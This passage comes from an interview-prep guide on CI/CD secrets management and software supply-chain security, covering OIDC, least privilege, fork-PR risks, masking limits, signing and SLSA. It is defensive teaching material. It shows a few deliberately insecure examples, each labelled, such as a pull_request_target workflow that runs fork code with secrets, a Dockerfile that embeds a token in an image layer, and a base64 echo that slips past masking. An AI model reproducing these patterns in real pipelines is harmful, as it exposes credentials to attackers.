# environment-scoped secret, only readable by the gated 'production' env
jobs:
  deploy:
    environment: production   # protection rules apply
    steps:
      - run: ./deploy.sh
        env:
          API_TOKEN: ${{ secrets.API_TOKEN }}  # env-scoped, not repo-wide
```

Cross-cutting rules regardless of store: **least privilege** (each secret readable by only the jobs that need it), **rotation** (short lifetimes, automated), and **never rely on masking** as your only protection.

### Q3. Explain OIDC for cloud authentication in CI/CD. Why is it the modern best practice?

OIDC lets the pipeline **prove its identity to a cloud and receive short-lived credentials, so you store no long-lived cloud keys at all.** It's the single highest-impact change you can make to pipeline security.

How it works:
1. The CI provider (GitHub) acts as an **OIDC identity provider**. For a job with `id-token: write`, it mints a **signed JWT** describing the run — the repo, branch/ref, environment, workflow.
2. The job presents that token to the cloud (e.g. AWS STS `AssumeRoleWithWebIdentity`).
3. The cloud's IAM **trust policy** validates the token's signature and checks **conditions** on its claims — e.g. the `sub` must be `repo:acme/app:ref:refs/heads/main`. Only matching runs may assume the role.
4. The cloud returns **short-lived credentials** (minutes), scoped to that IAM role's permissions.

```yaml
jobs:
  deploy:
    permissions:
      id-token: write   # allow requesting the OIDC token
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy
          aws-region: eu-west-1
      # short-lived creds now in env; no AWS keys stored anywhere
```

Why it's better than stored keys:
- **No long-lived secret to steal.** A leaked log/artifact contains a token that already expired.
- **Scoped by trust conditions** to a specific repo *and branch/environment* — a fork or a feature branch can't assume the prod role.
- **No rotation burden** — creds are ephemeral by construction.
- **Auditable** — the cloud logs exactly which repo/ref assumed the role.

The one thing to get right: **lock down the trust policy conditions.** A trust policy that matches `repo:acme/app:*` (any ref) lets any branch assume prod — pin it to the branch/environment you actually deploy from.

### Q4. What does least privilege mean for a pipeline's identity, and how do you apply it to GITHUB_TOKEN and deploy roles?

Least privilege means **every identity the pipeline uses has exactly the permissions it needs for its job and nothing more** — so a compromise of any one step has minimal blast radius. Two identities to scope:

**The `GITHUB_TOKEN`.** Auto-provisioned per job to interact with the repo/API. It defaults to broad in older setups — set it **read-only by default** and grant write only on the specific job that needs it:

```yaml
permissions:
  contents: read          # default for the whole workflow
jobs:
  release:
    permissions:
      contents: write      # only THIS job can push tags/releases
      packages: write      # only to publish the package
```

**The cloud deploy role.** Scope the IAM role the pipeline assumes to the specific actions, resources, and environment it deploys — not `AdministratorAccess`. A role that only needs to update one ECS service shouldn't be able to read every S3 bucket or touch IAM.

Additional applications:
- **Separate build creds from deploy creds.** The build job needs registry *push*; the deploy job needs cluster/service *update*. Different identities, so compromising the build stage doesn't grant deploy-to-prod.
- **Per-environment roles.** The staging job assumes a staging role; only the gated prod job can assume the prod role (enforced by OIDC trust conditions + environment protection).
- **Time-box it** — OIDC short-lived creds mean even the scoped power expires in minutes.

The interviewer wants to hear you reason about **blast radius**: "if this exact step is compromised, what can the attacker reach?" — and shrink that answer at every identity.

### Q5. A fork opens a PR and your CI leaks secrets to it. What went wrong and how do you fix it?

The classic cause: the workflow uses **`pull_request_target`** (or otherwise exposes secrets to fork-controlled code). Here's the danger.

- **`pull_request`** runs fork PRs in a **restricted** context: **no secrets**, read-only token. Safe, because a fork's PR contains attacker-controlled code and you must assume it's hostile.
- **`pull_request_target`** runs in the **base repo's** context — **with secrets and a writable token** — but at the *base* ref. It exists for legitimate cases (labeling PRs). The footgun: if such a workflow **checks out and executes the PR's head code** (build scripts, `npm install` running lifecycle scripts, a Makefile), the attacker's code now runs *with your secrets in the environment*. They exfiltrate them in one line.

```yaml
# DANGEROUS: runs with secrets AND executes fork code
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }  # attacker code
      - run: npm ci && npm run build   # executes it WITH secrets in env
```

**Fixes:**
- **Use `pull_request` for anything that builds/tests fork code** — it runs without secrets by design. If the tests genuinely don't need secrets, this is the whole fix.
- If you truly need secrets for fork PRs, **gate on manual approval**: require a maintainer to review the diff and approve the run before it executes (GitHub's "require approval for fork PRs" + a `labeled`/environment gate). A human vouches for the code before it touches secrets.
- **Never `checkout` the PR head in a `pull_request_target` workflow that has secrets.** Keep secret-bearing jobs and fork-code-executing jobs strictly separate.
- **Least privilege still applies** — even an approved fork run should get a minimal token and no prod deploy role.

Root principle: **untrusted code and secrets must never share an execution context.** This is the same trust-boundary failure as poisoned pipeline execution.

### Q6. What are environment protection rules and how do they secure production deploys?

Environment protection rules are **gates attached to a named deployment environment (e.g. `production`) that must be satisfied before any job targeting that environment runs or can read its secrets.** They move the "who can deploy to prod" decision out of workflow YAML (which any PR can edit) into repo settings.

What you can enforce on an environment:
- **Required reviewers** — one or more named people/teams must approve before the job proceeds (human gate on the promotion-to-prod hop). Supports a two-person rule.
- **Branch/tag restrictions** — only deploys triggered from `main` (or a `v*` tag) may target `production`; a feature branch can't.
- **Wait timer** — an enforced delay (a soak/cancel window) before deploy.
- **Environment-scoped secrets** — the prod cloud role / signing key lives on the `production` environment and is **only readable by jobs that pass its gates**. A job that doesn't reference `environment: production` can't touch them.

```yaml
jobs:
  deploy-prod:
    environment: production   # required reviewers + branch filter enforced here
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

Why it's strong: the rules live in **protected repo settings**, not in the workflow file, so an attacker who can open a PR (and thus edit `.github/workflows`) still can't bypass the prod reviewers or read the prod secrets. Combined with **OIDC trust conditions** scoped to the environment, you get defense in depth: even if a job *tried* to assume the prod role, the cloud-side trust policy would also reject it. This is the concrete mechanism behind "who approves what" from the path-to-prod topic.

### Q7. How do secret masking and log-leak prevention work, and where do they fall short?

**Secret masking** is the CI system automatically **replacing known secret values with `***` in log output.** When you register a value as a secret, the runner scans stdout/stderr for that exact string and redacts it. It's a useful backstop — but it is **not a security boundary**, and relying on it is a classic junior mistake.

Where it fails:
- **Transformed values slip through.** Masking matches the *literal* value. If your script base64-encodes, JSON-wraps, URL-encodes, or otherwise transforms the secret before printing, the masker doesn't recognize it. `echo $SECRET | base64` leaks cleanly.
- **Derived secrets aren't known.** A token minted *from* a secret at runtime was never registered, so it's never masked.
- **Non-log exfiltration is unaffected.** Masking only touches logs. A malicious step can write the secret to an artifact, POST it to an external host, or bake it into an image layer — masking sees none of that.
- **Structured output & error dumps** — a crash that dumps the environment can leak in a form the masker misses.

So masking is defense-in-depth, and the real controls are:
- **Don't put reusable secrets in the environment at all** — OIDC short-lived creds mean a leak is a near-expired token.
- **Least privilege** so a leaked secret is low-value.
- **Scan artifacts and logs** for leaks (gitleaks/trufflehog) rather than trusting redaction.
- **Never echo secrets**, avoid `set -x` in secret-bearing scripts, and keep untrusted code out of secret-bearing jobs.

Give the interviewer the one-liner: *"Masking is a seatbelt, not a wall — I design so that even an unmasked leak isn't catastrophic."*

### Q8. How do secrets leak through artifacts, build args, and image layers — and how do you prevent it?

Beyond logs, secrets escape through **anything the build persists or publishes.** Three common channels:

**Docker build args / ENV.** `ARG`/`ENV` values and anything written during a `RUN` are baked into **image layers** and visible to anyone who pulls the image (`docker history`, unpacking layers). A secret passed as `--build-arg` or `ENV SECRET=...` is **permanently embedded**, even if a later layer "deletes" the file — the earlier layer still contains it.

```dockerfile
# LEAK: token is in the image layer forever
ARG NPM_TOKEN
RUN echo "//registry/:_authToken=${NPM_TOKEN}" > .npmrc && npm ci
```

Fix with **BuildKit secret mounts**, which expose the secret only during that `RUN` and never write it to a layer:

```dockerfile
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=npm_token \
    NPM_TOKEN=$(cat /run/secrets/npm_token) npm ci
```

**Build artifacts.** A secret accidentally written into a bundle, a `.env` file zipped into the artifact, or a config file with a live key gets uploaded and stored — and downstream jobs (or anyone with artifact access) can read it. Never write secrets to the workspace; scan artifacts before upload.

**Caches.** A dependency cache or layer cache can capture a `.netrc`/`.npmrc` with credentials and restore it into later runs.

Prevention checklist:
- Use **BuildKit secret/SSH mounts**, never `--build-arg`, for build-time credentials.
- Inject runtime secrets **at runtime** (env/secret manager), not at build time.
- **Scan images and artifacts** for embedded secrets in the pipeline (trufflehog on layers).
- Keep a **`.dockerignore`** so `.env`/`.git` never enter the build context.
- Prefer **OIDC** so build-time cloud access needs no stored key at all.

### Q9. How do you scan for leaked secrets, and where in the workflow does it belong?

Secret scanning uses tools like **gitleaks** and **trufflehog** to detect credential patterns (high-entropy strings, known key formats) in code, history, and build outputs. Layer it at multiple points:

- **Pre-commit / local** — a gitleaks pre-commit hook stops a secret before it's ever committed. Cheapest place to catch it.
- **PR pipeline (shift-left)** — scan the diff on every PR so a secret can't merge. This is the required-check that gates merge.
- **Full-history + push protection** — platform **push protection** (GitHub secret scanning) blocks a push containing a recognized secret; periodic full-history scans catch what predates the tooling.
- **Post-build** — scan built **artifacts and image layers** (trufflehog on the image) for secrets baked in during the build.

```yaml
jobs:
  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }   # full history for gitleaks
      - uses: gitleaks/gitleaks-action@v2
```

Two realities to mention:
- **Detection is not remediation.** A found secret is *already exposed* — the moment it hit a shared branch or a log, treat it as compromised and **rotate it immediately**. Removing it from history (filter-repo) is cleanup, not a fix; assume it was scraped.
- **False positives** are common (example keys, test fixtures) — maintain an allowlist so the gate stays trusted and people don't learn to ignore it.

The mature stance: prevention (OIDC, no stored secrets) first, scanning as the safety net, and a *tested rotation runbook* for when the net catches something.

### Q10. What's the security risk of the Docker socket and privileged runners, and how do you reduce runner blast radius?

Mounting the **Docker socket (`/var/run/docker.sock`)** into a build or giving a runner **`--privileged`** is effectively **granting root on the host.** The Docker daemon runs as root; anything that can talk to its socket can start a container that mounts the host filesystem, escape to the node, and read every other job's secrets, caches, and credentials on that runner.

Why it's especially dangerous in CI: runners frequently execute **untrusted code** (dependencies, PR build steps). Untrusted code + Docker socket = trivial host takeover and lateral movement to whatever the runner can reach (often the cloud, via the runner's IAM).

Reduce blast radius:
- **Don't mount the Docker socket.** For building images, use **rootless, daemonless builders** — BuildKit/`buildx`, Kaniko, or Buildah — which build without a privileged daemon.
- **Avoid `--privileged`.** Drop capabilities, run as non-root, use user namespaces.
- **Ephemeral, single-job runners.** Each job gets a fresh runner that is destroyed after — nothing persists between jobs, so a compromise can't harvest the next job's secrets or plant persistence.
- **Isolate untrusted from trusted work.** Never run a fork PR's code on a runner that also handles prod deploys or holds prod creds; segregate runner pools.
- **Least-privilege runner identity + egress control.** The runner's own cloud role should be minimal, and network egress restricted so exfiltration/callbacks are harder.
- **Self-hosted runner caution.** Self-hosted runners on public repos are a known trap — a fork PR can run code on *your* infrastructure. Use ephemeral, sandboxed, least-privileged runners and never attach persistent secrets to them.

### Q11. Why and how should you pin third-party actions/dependencies, and what's the supply-chain risk?

Every `uses: some/action@v3` in your workflow is **executing a third party's code inside your trusted pipeline, with access to your job's secrets and token.** If that action is compromised — maintainer account takeover, a malicious update pushed to a tag — the attacker runs in *your* pipeline. This is a direct supply-chain vector (the Codecov-style class of attack).

The core problem: **tags are mutable.** `@v3` and even `@v3.1.0` can be re-pointed by the maintainer (or an attacker who compromised them) to new code. You think you pinned a version; you actually pinned a *moving pointer*.

**Pin by full commit SHA** — an immutable reference to exact code:

```yaml
steps:
  # BAD: @v4 is a moving tag
  - uses: actions/checkout@v4
  # GOOD: pinned to an immutable commit
  - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3  # v4.0.0
```

Supporting practices:
- **Automate SHA updates** (Dependabot/Renovate can pin and bump SHAs with a PR you review) so pinning doesn't mean staleness/missed security patches.
- **Minimize third-party actions** — prefer first-party/official actions or a short `run:` you control.
- **Scope the token** so even a malicious action gets a read-only `GITHUB_TOKEN` and no prod role.
- **Same logic for build dependencies** — lockfiles + pinned/verified versions so a build can't silently pull a poisoned package.

The interviewer's point: your pipeline's trust boundary includes *everyone whose code it runs.* Pin it, scope it, and keep the list short.

### Q12. How do you handle secret rotation, and why do short-lived credentials beat rotation?

**Rotation** is periodically replacing a secret so an undetected leak has a limited useful lifetime. **Short-lived credentials** make rotation almost moot by giving secrets a lifetime of minutes by construction. Both matter; the direction of travel is from the former to the latter.

**Rotation (for secrets that must exist):**
- Store them in a **secrets manager** (Vault / AWS/GCP Secret Manager) that supports automated rotation, so the pipeline always fetches the current version and rotation doesn't require touching every repo.
- **Automate it** on a schedule; manual rotation doesn't happen. Support **overlapping validity** (new and old both valid briefly) so rotation doesn't cause an outage.
- Rotate **immediately on any suspected exposure** — a secret that appeared in a log or a merged commit is compromised regardless of masking.

**Short-lived / ephemeral credentials (preferred):**
- **OIDC** for cloud access mints creds that expire in minutes and are scoped to the run — nothing to rotate, nothing durable to steal.
- **Dynamic secrets** — Vault can generate a short-TTL database credential per run and auto-revoke it.

Why short-lived wins: rotation shrinks the *window* of a leak; ephemerality shrinks it to near-zero *and* removes the standing target entirely. A leaked long-lived key is a fire drill; a leaked 15-minute token is usually already dead. The senior framing: *"I'd rather have no secret to rotate than a well-rotated secret — so OIDC and dynamic secrets first, rotation for the credentials I can't eliminate."*

### Q13. What is signing commits and tags, and what does it protect in the pipeline?

Signing attaches a **cryptographic signature (GPG, SSH, or Sigstore) to a commit or tag**, proving it came from a specific verified identity and hasn't been altered. It defends the **integrity and authenticity of the source** that feeds your pipeline.

What it protects against:
- **Commit/author spoofing.** Git author fields are trivially forgeable — anyone can set `user.name`/`user.email` to yours. A signature proves the commit genuinely came from the holder of the key, not an impersonator.
- **Tampered releases.** A **signed tag** on a release commit proves *this exact commit* is the intended release — an attacker can't slip a malicious commit under a trusted version tag.
- **Trust in the build input.** The pipeline (or branch protection) can **require signed commits**, so unsigned/unverified code can't reach main or trigger a release build.

```bash
git config commit.gpgsign true
git tag -s v1.4.0 -m "release 1.4.0"   # signed tag
git verify-tag v1.4.0                   # CI verifies before building
```

Where it fits: enforce **"require signed commits"** in branch protection, and **verify signatures in CI** before building a release. It's the *source-side* complement to **artifact signing** (cosign, in the supply-chain topic): signing commits/tags secures *what went into* the build; signing artifacts secures *what came out.* Together they close the loop — verified source in, verified artifact out. Sigstore's keyless signing (tied to OIDC identity) is making both far easier to adopt without managing long-lived signing keys.

### Q14. How do you audit who deployed what, and why does it matter?

You want an **immutable, attributable trail** answering: *which artifact went to which environment, triggered by whom, approved by whom, when.* This is both a security control (detect/investigate abuse) and a change-management requirement (compliance, incident response).

What to capture and where it comes from:
- **The deploy identity and approver** — CI records who triggered the run and who satisfied the **environment's required-reviewer** gate. Separation of duties is only meaningful if it's logged.
- **The exact artifact** — the git-sha/digest deployed, so you can tie any prod behavior to specific code. "Build once, promote the digest" makes this precise: one immutable ID from commit to prod.
- **Cloud-side records** — because the deploy assumes a role via **OIDC**, the cloud's audit log (CloudTrail) records exactly which repo/ref/run assumed the role and what it did. That's tamper-resistant and outside the pipeline's control.
- **Pipeline logs + VCS history** — the workflow run, the merge, the approvals, the config-repo commit (in GitOps, the deploy *is* an auditable Git commit).

Why it matters:
- **Incident response** — when prod breaks or is breached, you reconstruct the timeline: what shipped, who approved it, what identity touched prod.
- **Deterrence & accountability** — people behave differently when actions are attributable.
- **Compliance** — regulated environments *require* a demonstrable, immutable change record.

Key property: the audit trail must be **outside the actor's ability to edit** — cloud audit logs and protected VCS history, not a log file the deploy job could rewrite. GitOps helps here: every deploy is a signed-off Git commit in a separate, protected config repo.

### Q15. What is break-glass access, and how do you design it safely?

**Break-glass** is a pre-planned, tightly-controlled path to **elevated/emergency access** for when the normal, least-privilege flow can't resolve an incident — e.g. the pipeline is down and you must deploy a fix manually, or you need direct prod access to stop an outage. The name is the metaphor: the glass is there, but breaking it is loud and leaves evidence.

The tension it resolves: least privilege says "no standing admin access to prod," but a 3am SEV-1 sometimes genuinely needs it. Break-glass gives you a *controlled exception* instead of everyone quietly holding admin "just in case."

Design principles:
- **Off by default, explicitly granted.** No standing elevated access; it's requested/activated for the incident.
- **Heavily audited and alerting.** Every use fires alerts and writes an immutable audit record — using it is *visible*, not quiet.
- **Time-boxed** — access auto-expires after a short window; no lingering elevation.
- **Justified and, ideally, dual-controlled** — requires a reason and, for the highest access, a second approver (two-person rule) even in emergencies.
- **Reviewed after the fact** — every break-glass use triggers a post-incident review: was it warranted, what standing gap forced it, can we fix that so it's not needed next time.

The senior framing: break-glass isn't a backdoor around your controls — it's a *first-class, audited control* that lets you keep least-privilege everywhere else. If break-glass is being used routinely, that's a signal your normal path to prod is missing a legitimate capability.

### Q16. "Secure this pipeline." A team stores an AWS key as a repo secret, builds fork PRs with pull_request_target, and uses actions pinned to @main. What do you fix, in order?

I'd triage by **blast radius** — biggest exposures first.

**1. Kill the fork-PR secret leak (critical, actively exploitable).** `pull_request_target` that builds fork code runs attacker-controlled code *with secrets*. Switch fork build/test to `on: pull_request` (no secrets by design); if secrets are genuinely needed, gate fork runs behind **manual maintainer approval** and never `checkout` the PR head in a secret-bearing job. This is a live path for anyone on the internet to steal your creds.

**2. Eliminate the long-lived AWS key (critical).** Replace the stored key with **OIDC** — `permissions: id-token: write`, assume an IAM role via `configure-aws-credentials`, and a **trust policy scoped to `repo:acme/app` and the deploy branch/environment.** Now there's no durable cloud key to steal, and it's scoped so a fork/feature branch can't assume the prod role. Delete and rotate the old key.

**3. Pin actions by SHA (high).** `@main` is a fully mutable pointer — the maintainer (or an attacker) can change what runs anytime. Pin every third-party action to a **full commit SHA**, and add Renovate to bump them via reviewed PRs.

**4. Least-privilege the identities (high).** Set the workflow `GITHUB_TOKEN` to `contents: read` by default, grant write only per-job where needed. Scope the AWS role to the specific deploy actions/resources, not admin. Separate build creds from deploy creds.

**5. Gate prod (medium).** Put prod behind an **environment with required reviewers + branch restriction**, and move the prod cloud role/signing secrets to that environment so only approved deploys can use them.

**6. Harden the runners + add scanning (medium).** Ephemeral single-job runners, no Docker socket / `--privileged`, and add gitleaks + dependency/image scanning as required checks.

Then I'd state the principle I applied: **no untrusted code near secrets, no long-lived cloud keys, least privilege everywhere, immutable pins, and a human gate on prod.**

## Pipeline Security & Supply Chain

### Summary

**What this topic covers**

The build pipeline and its dependencies *are* an attack surface — and one of the most consequential, because compromising a build compromises everyone who trusts its output. This topic covers **software supply-chain security for CI/CD**: the threat landscape (SolarWinds, Codecov, dependency-confusion — the build system and dependency tree as the vector), **SLSA** (the framework and its levels/provenance requirements), **provenance & attestations** (cryptographically recording how/where/from-what an artifact was built), **artifact & image signing** (cosign/Sigstore keyless signing and verifying at admission so only trusted artifacts run), **dependency security** (SCA, lockfiles, pinning, dependency-confusion/typosquatting, checksums, internal proxies), **SAST/DAST/secret-scanning gates** and the false-positive reality, **poisoned pipeline execution** and the `pull_request_target`/untrusted-input footguns, **runner hardening/isolation**, **pinning actions by SHA**, protecting the CI system itself (RBAC, audit, branch protection on pipeline definitions), **SBOMs** for incident response, **admission control** (Kyverno/OPA/Binary Authorization) enforcing signed+scanned, the two-person rule, and a full **build → sign → verify → deploy** secure-chain design. 15 questions.

**Mental model**

Shift your trust question from *"is my code secure?"* to *"can I trust every input to, and every output of, my build — and prove it?"* A modern app is mostly other people's code (dependencies, base images, actions) assembled by an automated system; the attacker's cheapest path is often *not* your code but something you pull in or the machine that assembles it. So supply-chain security is about **provable integrity end to end**: trusted, verified **inputs** (pinned, checksummed, proxied dependencies; SHA-pinned actions) → a **hardened, isolated build** that can't be tampered with (ephemeral least-privilege runners, no untrusted code in trusted context) → **signed, attested outputs** (provenance saying exactly how/where/from-what this artifact was built) → **verification at the deployment gate** (admission control that only runs artifacts that are signed and pass policy). SLSA is the ladder that formalizes this. The unifying idea: **don't trust, verify — cryptographically, at every hop — and refuse to run what you can't verify.**

**Key terms**

- **Software supply chain** — everything that contributes to your artifact: source, dependencies, build tools, the CI system, base images, third-party actions.
- **SLSA** — Supply-chain Levels for Software Artifacts: a framework of increasing guarantees (tracks/levels) against build tampering, centered on provenance.
- **Provenance** — verifiable metadata about *how* an artifact was produced: source commit, builder, build steps, inputs. Answers "where did this really come from?"
- **Attestation** — a signed statement about an artifact (its provenance, its SBOM, its scan results); `in-toto` is the common format.
- **Artifact/image signing** — cryptographically signing the built artifact (cosign) so consumers can verify authenticity and integrity.
- **Sigstore / keyless signing** — signing tied to a short-lived OIDC identity with a transparency log, removing long-lived signing keys.
- **SCA (Software Composition Analysis)** — scanning dependencies for known vulnerabilities (Dependabot/Renovate/Snyk).
- **Dependency confusion / typosquatting** — attacks that trick the resolver into pulling a malicious package (internal-name collision, look-alike name).
- **SBOM** — Software Bill of Materials: a machine-readable inventory of every component in an artifact.
- **PPE (Poisoned Pipeline Execution)** — injecting attacker-controlled build steps (via a PR/fork/config) to run malicious code in the trusted pipeline.
- **Admission control** — a deploy-time gate (Kyverno/OPA/Binary Authorization) that only admits artifacts meeting policy (signed, scanned, provenance-verified).
- **SAST / DAST** — static (code) / dynamic (running app) security testing gates in the pipeline.

**Why interviewers ask this**

Supply-chain attacks (SolarWinds, Codecov, the log4j scramble, npm/PyPI poisonings) turned this from a niche into a board-level concern, and executive orders now mandate SBOMs and provenance. Interviewers use it to find engineers who think beyond "my code passes tests." A junior secures their own code; a senior secures **the pipeline that builds it and the ingredients that go into it**, and can articulate a *chain* of controls — verified inputs, hardened build, signed provenance, verified deploy — rather than one tool. The strongest signal is naming the frameworks (SLSA) and the concrete mechanisms (cosign keyless signing, admission control refusing unsigned images, SHA-pinned actions, dependency proxies) *and* being honest about the operational reality (false positives, the toil of SBOMs, that SLSA is a journey). It reveals whether you can design defense-in-depth for the thing that touches production.

**Common confusions**

- "My dependencies are fine because they're popular" — popular packages get compromised precisely *because* they're high-leverage; popularity is a target, not a shield.
- "Signing proves the code is safe" — signing proves *authenticity and integrity* (who built it, unaltered), not that the code is free of vulnerabilities. Different guarantees.
- "An SBOM makes me secure" — an SBOM is an *inventory*; its value is knowing your exposure fast (log4j), not preventing anything on its own.
- "SLSA is a tool I install" — SLSA is a *framework of levels*; you achieve it by how you build, not by adding a product.
- "Scanning green = safe" — scanners have false negatives and false positives; a clean SCA report means "no *known* CVEs today," not "secure."
- "Provenance and signing are the same" — provenance is the *statement of how/where built*; signing is *cryptographically vouching* for a statement/artifact. Provenance is usually delivered *as* a signed attestation.

**What follows from this topic**

This is the integrity-of-what-you-ship half of pipeline security; it pairs with **Secrets & Security in CI/CD** (protecting the credentials and execution environment). Together they secure both halves of the **path to production**: this topic hardens the "build the immutable artifact" step and adds a "verify before it runs" gate at the "promotion to production" hop — admission control refusing anything unsigned or unscanned. PPE here is the same trust-boundary root as the fork-PR/`pull_request_target` risk in the secrets topic.

### Q1. Describe the software supply-chain threat landscape for CI/CD. What are the attack classes?

The core realization: **an attacker doesn't need to breach your code — they can compromise something your pipeline trusts and let *you* ship it for them.** The build system and dependency tree are the vector. The major classes:

- **Compromised build system (SolarWinds).** Attackers implanted malicious code into the *build process*, so the official, signed artifact was itself backdoored. Every downstream customer trusted and installed it. Lesson: the build environment's integrity is paramount — signing a tampered build just signs the malware.
- **Compromised CI tooling (Codecov).** A widely-used CI script was altered to exfiltrate environment variables (secrets) from thousands of pipelines that ran it. Lesson: everything your pipeline executes (third-party actions, uploaders, scripts) is part of your trust boundary.
- **Dependency-tree attacks.** **Dependency confusion** (publish a malicious public package matching an internal name so the resolver grabs it), **typosquatting** (look-alike names), **malicious updates** (a legit package's maintainer account is taken over and a bad version pushed). This is the highest-volume class.
- **Poisoned pipeline execution (PPE).** A PR/fork injects a malicious build step (via editable CI config or untrusted input) to run attacker code in your trusted context and steal secrets or tamper output.
- **Compromised artifacts/registry** — swapping or tampering with the stored artifact between build and deploy.

The through-line: **trust is transitive and mostly implicit.** You trust your deps, their deps, your base image, your actions, your runners, your registry — and any one of them can be the way in. Supply-chain security is about making that trust **explicit and verifiable** at every link.

### Q2. What is SLSA and what does it protect against?

**SLSA (Supply-chain Levels for Software Artifacts)** is a framework of **graduated security levels for how software is built**, designed to protect the integrity of the build and produce **verifiable provenance**. It gives you a common language and a ladder to climb, rather than a single product to buy.

What it protects against: **tampering with the build and the artifact** — the SolarWinds class (someone altering what gets built or slipping a different artifact through) — by requiring that you can *prove* an artifact was built from the expected source, by the expected builder, without interference.

The **Build track** levels, roughly:
- **L1** — the build is scripted/automated and produces **provenance** (metadata about how it was built). Basic transparency.
- **L2** — the build runs on a **hosted build service** and the provenance is **signed/authenticated**, so it can't be forged trivially.
- **L3** — **hardened, isolated builds**: the build platform prevents tampering and runs are isolated (no cross-contamination, non-falsifiable provenance). This is the meaningful bar for defending against a compromised build.

Higher levels demand stronger isolation and non-falsifiability. The key ideas the interviewer wants: SLSA is **provenance-centric**, it's about **build integrity** (not your source code's bugs), it's a **journey of levels** you adopt incrementally, and reaching L3 typically means using a trusted, isolated builder (e.g. GitHub Actions' reusable-workflow-based generators) that emits signed provenance you can verify at deploy time. It pairs with signing and admission control: SLSA produces the *proof*; verification enforces it.

### Q3. What are provenance and attestations, and how do you generate build provenance?

**Provenance** is verifiable metadata answering *"how, where, and from what was this artifact built?"* — the source commit/repo, the builder identity, the build steps/parameters, and the input materials. It's what lets a consumer confirm an artifact really came from the expected pipeline and source, not from an attacker's laptop.

An **attestation** is a **signed statement about an artifact.** Provenance is typically *delivered as* a signed attestation (commonly in the **in-toto** format): "builder X built artifact with digest Y from source commit Z, using these inputs" — signed so it can't be forged. Other attestations can wrap an SBOM or scan results. The pattern generalizes: *a signed claim about an artifact that a verifier can check.*

Generating it (build provenance via GitHub Actions attestations):

```yaml
jobs:
  build:
    permissions:
      id-token: write     # OIDC identity for keyless signing
      contents: read
      attestations: write # record the attestation
    steps:
      - uses: actions/checkout@v4
      - id: build
        uses: docker/build-push-action@v6
        with: { push: true, tags: ghcr.io/acme/app:${{ github.sha }} }
      - uses: actions/attest-build-provenance@v1
        with:
          subject-name: ghcr.io/acme/app
          subject-digest: ${{ steps.build.outputs.digest }}
```

BuildKit can also emit SLSA provenance inline; `in-toto` and Sigstore underpin the formats/signing. At deploy time you **verify** the attestation (the artifact's digest has provenance from the expected repo/builder) before admitting it. Provenance is the *evidence*; signing makes it *trustworthy*; admission control *enforces* it.

### Q4. Explain artifact/image signing with cosign and Sigstore keyless signing. Why verify at admission?

**Signing** cryptographically vouches that an artifact was produced by a known identity and hasn't been altered since. **cosign** (part of Sigstore) signs container images and other artifacts; consumers **verify** the signature before trusting the artifact. It guarantees **authenticity + integrity** — *not* that the code is vulnerability-free.

**Keyless signing** removes the biggest operational pain — managing and protecting long-lived signing keys. Instead:
- The signer authenticates via **OIDC** (e.g. the GitHub Actions workflow identity) and gets a **short-lived certificate** from Sigstore's CA (Fulcio) bound to that identity.
- The signature + certificate are recorded in a public **transparency log** (Rekor), so signatures are auditable and non-repudiable.
- No private key sits in your CI to be stolen.

```bash
# keyless sign (identity from the CI OIDC token), then verify by identity
cosign sign ghcr.io/acme/app@sha256:abcd...
cosign verify ghcr.io/acme/app@sha256:abcd... \
  --certificate-identity-regexp '^https://github.com/acme/app/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

**Why verify at admission** (not just at build): signing is worthless if nothing *checks* it before running. **Admission control** in the deploy target (Kyverno / OPA Gatekeeper / Binary Authorization) rejects any image that isn't **signed by the expected identity** (and, layered up, has valid provenance and a clean scan). This closes the loop: an attacker who swaps in a tampered or unsigned image at the registry/deploy step is **refused at the cluster gate.** Verifying at admission turns signing from a nice-to-have artifact into an *enforced* prerequisite for running in prod.

### Q5. How do you secure dependencies against known vulns, dependency confusion, and typosquatting?

Dependencies are the highest-volume attack surface, so I'd layer defenses across *known-vuln management* and *resolver-trust*.

**Known vulnerabilities (SCA):**
- Run **Software Composition Analysis** — Dependabot/Renovate/Snyk — to flag deps with known CVEs, as a PR check and on a schedule. Treat it as *"no known CVEs today,"* not proof of safety.
- **Automate updates** (Renovate/Dependabot PRs) so patching is continuous, not a quarterly scramble — the log4j lesson.

**Integrity / pinning:**
- **Lockfiles + checksums** (`package-lock.json`, `poetry.lock`, `Cargo.lock`, `go.sum`) so every build resolves the *exact* versions and verifies **hashes** — a mutated package fails the checksum. Commit them and build with the frozen resolver (`npm ci`, `--frozen-lockfile`).
- **Pin versions**; don't float on `^`/`latest` in a way that lets a compromised new release slide in unreviewed.

**Dependency confusion:**
- Caused by the resolver preferring a **public** package over your **internal** one of the same name. Fix: an **internal proxy/registry** (Artifactory/Nexus) as the *single* source, scoped namespaces/`@scope`, and explicit registry routing so internal names never resolve to the public index.

**Typosquatting:**
- Look-alike names (`reqeusts`, `crossenv`). Defenses: an **allowlisted internal proxy** (only vetted packages), scanning for suspicious/newly-published deps, and code review of new dependency additions.

**The proxy as the linchpin:** routing *all* dependency pulls through a controlled internal proxy gives you caching, allowlisting, checksum enforcement, blocking of yanked/malicious versions, and immunity to confusion — one chokepoint you can secure and audit.

### Q6. What is poisoned pipeline execution (PPE), and how do the pull_request_target / untrusted-input footguns enable it?

**Poisoned Pipeline Execution** is getting **attacker-controlled instructions to run inside the trusted CI pipeline** — where the secrets, tokens, and deploy access live. The attacker doesn't breach the CI system; they get *it* to execute *their* build step.

Two flavors:
- **Direct PPE** — the attacker can edit the pipeline definition itself (e.g. the CI config is in the repo and a PR to it runs with privileges), so they add a step that dumps secrets.
- **Indirect PPE** — the attacker influences something the pipeline *executes* without editing the config directly: a `Makefile`, a build script, a test, an `npm` lifecycle script, or a config file the pipeline reads and runs. Their code runs as a side effect of a normal build.

